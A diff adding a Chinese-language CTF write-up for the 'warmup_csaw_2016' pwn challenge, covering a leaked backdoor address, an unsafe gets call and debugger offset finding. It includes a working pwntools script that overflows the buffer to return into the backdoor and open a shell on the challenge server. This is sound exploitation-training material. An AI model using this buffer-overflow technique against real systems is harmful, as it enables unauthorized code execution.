@@ -621,6 +621,59 @@ if __name__ == "__main__":
     main()
 ```
 
+#### 例题 2：warmup_csaw_2016 1
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#warmup_csaw_2016)
+
+运行可执行文件，得到一些神秘的东西：
+
+```
+┌──(Sonnety㉿LAPTOP-R4AP2N3H)-[/mnt/d/CTF_samples/warmup-csaw-2016]
+└─$ ./warmup_csaw_2016
+-Warm Up-
+WOW:0x40060d
+```
+
+IDA 反编译一下，发现这是后门函数地址。
+
+<img width="1024" height="181" alt="image" src="https://github.com/user-attachments/assets/b0e020a7-07c6-446b-b01f-bf10b0d0645d" />
+
+<img width="1278" height="392" alt="image" src="https://github.com/user-attachments/assets/37810f8f-5c9a-484f-9145-6e275e253fa3" />
+
+而且还有 gets，只剩下算偏移了。
+
+这个题做了去符号，`disas main`找不到地址，所以执行 `starti`，在 `gets` 上打断点。
+
+<img width="558" height="715" alt="image" src="https://github.com/user-attachments/assets/86f56263-8820-4842-aa12-8a858eeb8375" />
+
+<img width="1157" height="676" alt="image" src="https://github.com/user-attachments/assets/8fd17e8e-7d7a-4a14-8c6f-eca6a08fa595" />
+
+<img width="982" height="238" alt="image" src="https://github.com/user-attachments/assets/0d5108f1-80d4-4928-a0ae-cba227da7c71" />
+
+```
+# written by Sonnety
+from pwn import *
+
+host = "node5.buuoj.cn"
+port = 28105
+
+offset = 72
+backdoor = 0x40060d
+
+def main():
+	io = remote(host,port)
+	
+	try:
+		io.recvuntil(b"WOW:0x40060d",timeout=2)
+	except Exception:
+		pass
+	payload=b"A"*offset+p64(backdoor)
+	io.sendline(payload)
+	io.interactive()
+if __name__ == "__main__":
+	main()
+
+```
 
 #### 一个例题
 
